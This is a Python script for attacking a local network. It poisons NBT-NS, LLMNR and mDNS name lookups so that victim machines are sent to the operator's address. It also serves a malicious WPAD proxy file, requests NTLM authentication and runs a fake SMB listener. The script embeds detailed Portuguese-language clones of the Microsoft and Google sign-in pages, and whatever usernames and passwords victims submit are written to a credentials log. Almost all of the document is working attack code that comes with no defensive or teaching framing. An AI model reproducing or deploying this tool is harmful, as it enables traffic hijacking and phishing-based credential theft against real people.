#!/usr/bin/env python3
"""Targeted NBT-NS/LLMNR Responder + WPAD + SMB + HTTP capture"""
import socket, struct, threading, time, sys, os, http.server

import os
_BASEDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HASH_LOG = os.path.join(_BASEDIR, "captures", "responder_hashes.txt")
CREDS_LOG = os.path.join(_BASEDIR, "captures", "creds_found.txt")
MY_IP = sys.argv[1] if len(sys.argv) > 1 else "172.17.200.23"

def log(msg):
    print(msg, flush=True)
    with open(HASH_LOG, "a") as f:
        f.write(msg + "\n")

def decode_nbname(enc: bytes) -> str:
    """Decode NetBIOS first-level encoded name."""
    out = []
    for i in range(0, min(len(enc), 32), 2):
        if i + 1 >= len(enc):
            break
        nib_h = (enc[i] - 0x41) & 0xF
        nib_l = (enc[i+1] - 0x41) & 0xF
        c = (nib_h << 4) | nib_l
        out.append(chr(c) if 32 <= c <= 126 else ".")
    return "".join(out).strip()

def nbns_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind(("0.0.0.0", 137))
    s.settimeout(1)
    while True:
        try:
            d, a = s.recvfrom(1024)
            if len(d) < 12: continue
            if struct.unpack(">H", d[2:4])[0] & 0x8000: continue
            p = 12; parts = []
            while p < len(d):
                l = d[p]
                if l == 0: p += 1; break
                if l & 0xC0: p += 2; break
                p += 1; parts.append(d[p:p+l].decode("latin-1", "replace")); p += l
            qname = ".".join(parts) if parts else "unknown"
            en = d[12:p] if p <= len(d) else b""
            if not en: continue
            en = en[:34].ljust(34, b"\x00")
            ip = [int(x) for x in MY_IP.split(".")]
            tid = struct.unpack(">H", d[0:2])[0]
            qr = en + struct.pack(">HH", 0x0020, 1)
            ar = en + struct.pack(">HHI", 0x0020, 1, 300) + struct.pack(">H", 6) + struct.pack(">BBBB", *ip)
            r = struct.pack(">HHHH", tid, 0x8500, 1, 1) + struct.pack(">HH", 0, 0) + qr + ar
            s.sendto(r, (a[0], 137))
            decoded = decode_nbname(en)
            log(f"[NBT-NS] {qname} = {decoded} <- {a[0]} -> POISONED")
        except socket.timeout: pass
        except: pass

def llmnr_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind(("0.0.0.0", 5355))
    s.settimeout(1)
    while True:
        try:
            d, a = s.recvfrom(1024)
            if len(d) < 12: continue
            flags = struct.unpack(">H", d[2:4])[0]
            if flags & 0x8000: continue
            p = 12; parts = []
            while p < len(d):
                l = d[p]
                if l == 0: p += 1; break
                if l & 0xC0: p += 2; break
                p += 1; parts.append(d[p:p+l].decode("latin-1", "replace")); p += l
            qname = ".".join(parts) if parts else "unknown"
            en = d[12:p] if p <= len(d) else b""
            ip = [int(x) for x in MY_IP.split(".")]
            tid = struct.unpack(">H", d[0:2])[0]
            qr = en + struct.pack(">HH", 1, 1)
            ar = en + struct.pack(">HHI", 1, 1, 30) + struct.pack(">H", 4) + struct.pack(">BBBB", *ip)
            r = struct.pack(">HHHH", tid, 0x8000 | (flags & 0x0FFF), 1, 1) + struct.pack(">HH", 0, 0) + qr + ar
            s.sendto(r, (a[0], 5355))
            log(f"[LLMNR] {qname} <- {a[0]} -> POISONED")
        except socket.timeout: pass
        except: pass

class WPADHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if "/wpad.dat" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "application/x-ns-proxy-autoconfig")
            self.end_headers()
            self.wfile.write(f"function FindProxyForURL(u,h){{return \"PROXY {MY_IP}:3128; DIRECT\";}}".encode())
        else:
            self.send_response(401)
            self.send_header("WWW-Authenticate", "NTLM")
            self.send_header("Proxy-Authenticate", "NTLM")
            self.end_headers()
    def do_CONNECT(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

def wpad_server():
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 3128), WPADHandler)
    log("[+] WPAD on :3128")
    srv.serve_forever()

def smb_capture():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("0.0.0.0", 445))
        s.listen(5)
        s.settimeout(2)
        log("[+] Fake SMB on :445")
        while True:
            try:
                conn, addr = s.accept()
                data = conn.recv(4096)
                if len(data) > 4:
                    log(f"[SMB_DATA] {addr[0]} sent {len(data)} bytes, type={data[0]:02x}")
                conn.close()
            except socket.timeout: pass
            except: pass
    except OSError:
        log("[!] Port 445 in use, SMB capture disabled")

FAKE_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Entrar na conta da Microsoft</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI','Helvetica Neue','Apple Color Emoji',sans-serif;background:#e9eef2;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden}

/* Background abstract shapes (similar to Microsoft Fluent design) */
.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
.bg-shapes svg{width:100%;height:100%}

/* Logo area - matches Microsoft design */
.logo-area{position:relative;z-index:1;margin-bottom:12px;display:flex;flex-direction:column;align-items:center}

/* Microsoft corporate logo: 4 squares + text */
.ms-logo{display:flex;align-items:center;gap:6px;margin-bottom:12px}
.ms-squares{display:grid;grid-template-columns:1fr 1fr;gap:1px;width:21px;height:21px;flex-shrink:0}
.ms-square-r{background:#f25022}
.ms-square-g{background:#7fba00}
.ms-square-b{background:#00a4ef}
.ms-square-y{background:#ffb900}
.ms-logo-text{font-size:20px;font-weight:600;color:#1b1b1b;letter-spacing:-.2px}

/* Card - exact Microsoft Fluent UI card */
.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.04),0 6px 24px rgba(0,0,0,.08);padding:34px 44px 36px;width:440px;max-width:92vw;position:relative;z-index:1}
.card h1{font-size:1.375rem;font-weight:600;color:#1b1b1b;margin-bottom:4px;line-height:1.2}
.card .subtitle{font-size:.9375rem;color:#5e5e5e;margin-bottom:28px;line-height:1.4}

/* Form elements - Fluent UI */
.input-wrap{position:relative;margin-bottom:8px}
.input-wrap input{width:100%;padding:4px 0 6px;font-size:.9375rem;border:none;border-bottom:1px solid #8c8c8c;outline:none;background:transparent;transition:border-color .15s;color:#1b1b1b;font-family:inherit}
.input-wrap input:focus{border-bottom-color:#0067b8;border-bottom-width:2px;padding-bottom:5px}
.input-wrap input::placeholder{color:#8c8c8c;font-size:.9375rem}
.input-wrap label{display:block;font-size:.75rem;font-weight:600;color:#1b1b1b;margin-bottom:4px}

/* Button - Microsoft blue #0067b8 */
.btn{display:block;width:auto;min-width:108px;padding:6px 20px;background:#0067b8;color:#fff;border:none;font-size:.9375rem;font-weight:600;cursor:pointer;float:right;margin-top:16px;line-height:1.2;text-align:center}
.btn:hover{background:#005da6}
.btn:active{background:#004e8c}
.btn:disabled{background:#c8c8c8;cursor:default}

/* Links */
.links{clear:both;padding-top:16px}
.links a{display:block;color:#0067b8;font-size:.8125rem;text-decoration:none;margin-bottom:8px}
.links a:hover{text-decoration:underline}
.links .signup{color:#0067b8;font-size:.8125rem}

/* Error message - Microsoft red */
.error{color:#e81123;font-size:.8125rem;margin:8px 0 0;display:none;clear:both}
.error-icon{display:inline-block;width:16px;height:16px;border-radius:50%;background:#e81123;color:#fff;text-align:center;line-height:16px;font-size:11px;font-weight:700;margin-right:6px;vertical-align:middle;flex-shrink:0}
.error-msg{display:flex;align-items:flex-start;gap:4px;margin-top:8px}
.error-msg span{line-height:1.3}
.loading{display:none;clear:both;text-align:right;padding-top:16px;font-size:.8125rem;color:#5e5e5e}
.loading::after{content:'';display:inline-block;width:12px;height:12px;border:2px solid #c8c8c8;border-top-color:#0067b8;border-radius:50%;animation:spin .8s linear infinite;margin-left:6px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}

/* Step 2 - hidden initially */
#step2{display:none}
#step2 .user-email{font-size:.9375rem;color:#1b1b1b;margin-bottom:20px;font-weight:500}
#step2 .user-email span{font-weight:400;color:#5e5e5e}
#step2 .back-link{display:inline-block;color:#0067b8;font-size:.8125rem;text-decoration:none;margin-bottom:20px;cursor:pointer}
#step2 .back-link:hover{text-decoration:underline}

/* Footer */
.footer{position:relative;z-index:1;margin-top:24px;text-align:center;font-size:.75rem;color:#8c8c8c}
.footer a{color:#5e5e5e;text-decoration:none;padding:0 12px;font-size:.75rem}
.footer a:hover{text-decoration:underline}
.footer .pipe{color:#c8c8c8}

/* Responsive */
@media(max-width:500px){.card{padding:24px 20px 28px}.btn{width:100%;float:none}}
</style></head>
<body>
<div class="bg-shapes"><svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
<defs><linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#e9eef2"/><stop offset="100%" stop-color="#dce3e8"/></linearGradient>
<linearGradient id="g2" x1="0" y1="0" x2="100%" y2="100%"><stop offset="0%" stop-color="#c8d8e4" stop-opacity=".6"/><stop offset="100%" stop-color="#a8c4d8" stop-opacity="0"/></linearGradient>
<linearGradient id="g3" x1="100%" y1="0" x2="0" y2="100%"><stop offset="0%" stop-color="#b8d0e0" stop-opacity=".5"/><stop offset="100%" stop-color="#d0e0ec" stop-opacity="0"/></linearGradient></defs>
<rect fill="url(#g1)" width="1440" height="900"/>
<path fill="url(#g2)" d="M0 500 Q 200 300, 500 450 T 1000 350 T 1440 400 L 1440 900 L 0 900Z"/>
<path fill="url(#g3)" d="M0 600 Q 300 500, 600 600 T 1100 500 T 1440 550 L 1440 900 L 0 900Z"/>
<path fill="url(#g2)" d="M0 350 Q 250 200, 550 300 T 1050 250 T 1440 300 L 1440 900 L 0 900Z" opacity=".4"/>
</svg></div>

<div class="logo-area">
<div class="ms-logo">
<div class="ms-squares"><div class="ms-square-r"></div><div class="ms-square-g"></div><div class="ms-square-b"></div><div class="ms-square-y"></div></div>
<div class="ms-logo-text">Microsoft</div>
</div>
</div>

<div class="card" id="card">
<div id="step1">
<h1>Entrar</h1>
<p class="subtitle">Use sua conta corporativa ou de estudante</p>
<div class="error" id="error1" style="display:none">
<div class="error-msg"><div class="error-icon">!</div><span id="error1Text">Nao foi possivel encontrar uma conta com este endereco de e-mail</span></div>
</div>
<div class="input-wrap">
<label for="username">E-mail, telefone ou Skype</label>
<input type="text" id="username" name="username" placeholder="nome@exemplo.com" autocomplete="username" autocorrect="off" autocapitalize="off" spellcheck="false">
</div>
<div style="clear:both"></div>
<div class="loading" id="loading1">Verificando...</div>
<button type="button" class="btn" id="btnStep1">Entrar</button>
<div class="links">
<a href="#" id="forgotLink">Nao consegue acessar sua conta?</a>
<a href="#" class="signup">Criar uma conta!</a>
</div>
</div>

<div id="step2">
<div style="margin-bottom:4px">
<a class="back-link" id="backBtn">&larr; Voltar</a>
</div>
<h1>Entrar</h1>
<p class="subtitle" id="userDisplay">nome@exemplo.com</p>
<div class="error" id="error2" style="display:none">
<div class="error-msg"><div class="error-icon">!</div><span id="error2Text">Sua conta ou senha esta incorreta. Se voce nao lembra sua senha, <a href="#" style="color:#0067b8;text-decoration:underline">redefina-a agora</a>.</span></div>
</div>
<div class="input-wrap">
<label for="password">Senha</label>
<input type="password" id="password" name="password" placeholder="Senha" autocomplete="current-password">
</div>
<div style="clear:both"></div>
<div class="loading" id="loading2">Entrando...</div>
<button type="button" class="btn" id="btnStep2">Entrar</button>
<div class="links">
<a href="#" id="forgotLink2">Nao consegue acessar sua conta?</a>
</div>
</div>
</div>

<div class="footer">
<a href="#">Termos de uso</a><span class="pipe">|</span><a href="#">Privacidade e cookies</a><span class="pipe">|</span><a href="#">...<br>Microsoft (c) 2026</a>
</div>

<script>
var step1=document.getElementById('step1'),step2=document.getElementById('step2');
var inpUser=document.getElementById('username'),inpPass=document.getElementById('password');
var btn1=document.getElementById('btnStep1'),btn2=document.getElementById('btnStep2');
var err1=document.getElementById('error1'),err2=document.getElementById('error2');
var err1t=document.getElementById('error1Text'),err2t=document.getElementById('error2Text');
var load1=document.getElementById('loading1'),load2=document.getElementById('loading2');
var userDisplay=document.getElementById('userDisplay');
var emailForPass='';

function showStep2(email){
emailForPass=email;userDisplay.textContent=email;
step1.style.display='none';step2.style.display='block';
err2.style.display='none';load2.style.display='none';
inpPass.value='';inpPass.focus();
document.getElementById('card').scrollIntoView({behavior:'smooth'});
}

function showStep1(){
step2.style.display='none';step1.style.display='block';
err1.style.display='none';load1.style.display='none';
inpUser.focus();
}

btn1.addEventListener('click',function(){
var email=inpUser.value.trim();
if(!email){err1t.textContent='Digite um endereco de e-mail, numero de telefone ou nome do Skype.';err1.style.display='block';return;}
err1.style.display='none';load1.style.display='block';btn1.disabled=true;
var x=new XMLHttpRequest();
x.open('POST','/',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){load1.style.display='none';btn1.disabled=false;showStep2(email);};
x.onerror=function(){load1.style.display='none';btn1.disabled=false;showStep2(email);};
x.send('step=1&username='+encodeURIComponent(email));
});

inpUser.addEventListener('keydown',function(e){if(e.key==='Enter')btn1.click();});
inpPass.addEventListener('keydown',function(e){if(e.key==='Enter')btn2.click();});

btn2.addEventListener('click',function(){
var pass=inpPass.value.trim();
if(!pass){err2t.innerHTML='Digite sua senha.';err2.style.display='block';return;}
err2.style.display='none';load2.style.display='block';btn2.disabled=true;
var x=new XMLHttpRequest();
x.open('POST','/',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){load2.style.display='none';btn2.disabled=false;err2t.innerHTML='Sua conta ou senha esta incorreta. Se voce nao lembra sua senha, <a href="#" style="color:#0067b8;text-decoration:underline">redefina-a agora</a>.';err2.style.display='block';};
x.onerror=function(){load2.style.display='none';btn2.disabled=false;err2t.innerHTML='Sua conta ou senha esta incorreta.';err2.style.display='block';};
x.send('step=2&username='+encodeURIComponent(emailForPass)+'&password='+encodeURIComponent(pass));
});

document.getElementById('backBtn').addEventListener('click',showStep1);
document.getElementById('forgotLink').addEventListener('click',function(e){e.preventDefault();alert('Redefinicao de senha: consulte seu administrador de TI');});
document.getElementById('forgotLink2').addEventListener('click',function(e){e.preventDefault();alert('Redefinicao de senha: consulte seu administrador de TI');});
setTimeout(function(){inpUser.focus();},100);
</script>
</body>
</html>"""

class FakeLoginHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if "/gmail" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(FAKE_LOGIN_GMAIL_PAGE.encode("utf-8"))
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(FAKE_LOGIN_PAGE.encode("utf-8"))
    def do_POST(self):
        l = int(self.headers.get("Content-Length", 0))
        b = self.rfile.read(l).decode("utf-8", "replace") if l > 0 else ""
        with open(CREDS_LOG, "a") as f:
            f.write(f"[FAKE_LOGIN] {self.client_address[0]}: {b}\n")
        log(f"\n[FAKE_LOGIN] >>> {self.client_address[0]} <<<")
        for pair in b.split("&"):
            log(f"  {pair}")
        log("")
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(b"""<html><body style="font-family:sans-serif;text-align:center;padding:40px">
<h2>Erro de autenticacao</h2>
<p>Nao foi possivel conectar voce. Verifique suas credenciais e tente novamente.</p>
<p><a href="/">Tentar novamente</a></p></body></html>""")
    def log_message(self, *a): pass

FAKE_LOGIN_GMAIL_PAGE = """<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fazer login - Contas Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto',Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:448px;max-width:90vw}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
.card h1{font-size:1.5rem;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.card p{font-size:1rem;color:#5f6368;text-align:center;margin-bottom:32px}
.input-group{margin-bottom:16px}
.input-group input{width:100%;padding:13px 15px;font-size:1rem;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border-color .15s}
.input-group input:focus{border-color:#1a73e8}
.btn{width:100%;padding:10px 0;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:.9375rem;font-weight:500;cursor:pointer;text-align:center;margin-top:8px}
.btn:hover{background:#1765cc}
.links{margin-top:16px;display:flex;justify-content:space-between}
.links a{color:#1a73e8;font-size:.875rem;text-decoration:none}
.links a:hover{text-decoration:underline}
.footer{margin-top:24px;text-align:center;font-size:.75rem;color:#5f6368}
.footer a{color:#5f6368;text-decoration:none;padding:0 16px}
.error{color:#d93025;font-size:.875rem;text-align:center;margin-top:8px;display:none}
</style></head>
<body>
<div class="card">
<div class="logo"><svg viewBox="0 0 75 24"><path d="M12 0C5.372 0 0 5.372 0 12s5.372 12 12 12 12-5.372 12-12S18.628 0 12 0z" fill="#4285F4"/><path d="M17.46 12.27c0-.48.04-.95.12-1.4H12v2.65h3.06c-.14.68-.53 1.26-1.12 1.64v1.36h1.8c1.06-.98 1.68-2.42 1.68-4.25z" fill="#34A853"/><path d="M12 19.2c1.52 0 2.8-.5 3.73-1.36l-1.8-1.36c-.5.34-1.14.54-1.93.54-1.48 0-2.74-1-3.19-2.35H5.96v1.4C6.97 17.7 9.32 19.2 12 19.2z" fill="#FBBC05"/><path d="M8.8 14.67c-.2-.6-.32-1.24-.32-1.9s.12-1.3.32-1.9V9.47H5.96c-.65 1.17-1.03 2.5-1.03 3.93s.38 2.76 1.03 3.93l2.84-2.66z" fill="#EA4335"/><path d="M12 6.98c.83 0 1.57.28 2.15.84l1.6-1.6C15.68 5.2 13.96 4.4 12 4.4c-2.68 0-5.03 1.5-6.04 3.67l2.84 2.2c.45-1.35 1.7-2.35 3.2-2.35z" fill="#4285F4"/></svg></div>
<h1>Fazer login</h1>
<p>Use sua conta do Google</p>
<form method="POST" action="/gmail" id="gmailForm">
<div class="input-group">
<input type="email" id="gmail_user" name="username" placeholder="E-mail ou telefone" autocomplete="username" required>
</div>
<div class="input-group">
<input type="password" id="gmail_pass" name="password" placeholder="Senha" autocomplete="current-password" required>
</div>
<button type="submit" class="btn">Proxima</button>
<div class="error" id="gmailError">Nao foi possivel encontrar sua conta Google</div>
</form>
<div class="links">
<a href="#">Criar conta</a>
</div>
</div>
<div class="footer"><a href="#">Ajuda</a><a href="#">Privacidade</a><a href="#">Termos</a></div>
<script>
document.getElementById('gmailForm').addEventListener('submit',function(e){
e.preventDefault();
var u=document.getElementById('gmail_user').value;
var p=document.getElementById('gmail_pass').value;
if(!u||!p){document.getElementById('gmailError').style.display='block';return;}
var x=new XMLHttpRequest();
x.open('POST','/gmail',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){document.getElementById('gmailError').style.display='block';};
x.send('username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));
});
</script>
</body>
</html>"""

def fake_login():
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 80), FakeLoginHandler)
    log("[+] Fake login on :80")
    srv.serve_forever()

def mdns_listener():
    """mDNS poisoning (UDP 5353) - for Apple Bonjour / Android devices"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.bind(("0.0.0.0", 5353))
    s.settimeout(1)
    while True:
        try:
            d, a = s.recvfrom(1024)
            if len(d) < 12: continue
            flags = struct.unpack(">H", d[2:4])[0]
            if flags & 0x8000: continue
            p = 12; parts = []
            while p < len(d):
                l = d[p]
                if l == 0: p += 1; break
                if l & 0xC0: p += 2; break
                p += 1; parts.append(d[p:p+l].decode("latin-1", "replace")); p += l
            qname = ".".join(parts) if parts else "unknown"
            en = d[12:p] if p <= len(d) else b""
            ip = [int(x) for x in MY_IP.split(".")]
            tid = struct.unpack(">H", d[0:2])[0]
            qr = en + struct.pack(">HH", 1, 1)
            ar = en + struct.pack(">HHI", 1, 1, 120) + struct.pack(">H", 4) + struct.pack(">BBBB", *ip)
            r = struct.pack(">HHHH", tid, 0x8000 | (flags & 0x0FFF), 1, 1) + struct.pack(">HH", 0, 0) + qr + ar
            s.sendto(r, (a[0], 5353))
            log(f"[mDNS] {qname} <- {a[0]} -> POISONED")
        except socket.timeout: pass
        except: pass


if __name__ == "__main__":
    log(f"[+] Responder started")
    log(f"[+] Our IP: {MY_IP}")
    log(f"[+] NBT-NS :137  LLMNR :5355  mDNS :5353")
    log(f"[+] WPAD  :3128  SMB   :445   HTTP :80")

    t1 = threading.Thread(target=nbns_listener, daemon=True)
    t2 = threading.Thread(target=llmnr_listener, daemon=True)
    t3 = threading.Thread(target=mdns_listener, daemon=True)
    t4 = threading.Thread(target=wpad_server, daemon=True)
    t5 = threading.Thread(target=smb_capture, daemon=True)
    t6 = threading.Thread(target=fake_login, daemon=True)

    t1.start(); t2.start(); t3.start(); t4.start()
    try: t5.start()
    except: log("[!] Port 445 in use, SMB capture disabled")
    t6.start()

    log("[*] All listeners active. Running indefinitely (Ctrl+C to stop)...")
    while True:
        time.sleep(60)
